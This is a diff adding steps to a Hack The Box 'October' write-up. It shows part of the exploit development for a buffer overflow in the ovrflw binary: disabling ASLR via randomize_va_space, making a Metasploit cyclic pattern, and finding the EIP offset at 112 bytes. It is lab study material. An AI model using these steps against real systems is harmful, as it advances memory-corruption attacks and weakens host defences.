@@ -110,6 +110,20 @@ www-data@october:/home/harry$ ldd /usr/local/bin/ovrflw
 ```
 
 I executed it several times to see if the addresses change and they do which means that _ASLR_ is active.
+We can deactivate that on our local machine to make analysis easier for us:
+```markdown
+echo 0 > /proc/sys/kernel/randomize_va_space
+```
+
+To identify where the Buffer Overflow occurs we need to create a unique pattern:
+```markdown
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
+```
+```markdown
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+```
+
+Nothing in this pattern repeats so we will use it to identify where the Buffer Overflow happens.
 
 #### Debugging the binary
 
@@ -126,12 +140,19 @@ Breakpoint 1 at 0x8048480
 
 As we can see with `checksec` the **NX (No eXecute)** is enabled which is **Data Execution Prevention (DEP)** so we can't execute shellcode and jump to it.
 
+Now we execute it with the unique pattern we created:
+
 ![Running the binary](https://kyuu-ji.github.io/htb-write-up/october/october_gdb_2.png)
 
 ![Continuation](https://kyuu-ji.github.io/htb-write-up/october/october_gdb_3.png)
 
-The program crashes as intended at 0x41414141 which means it crashed at the 4th "A".
+The program crashes at 0x64413764.
 
+```markdown
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 64413764
 
+[] Exact match at offset 112
+```
 
+Which is at 112 bytes where we start to overwrite EIP.
 
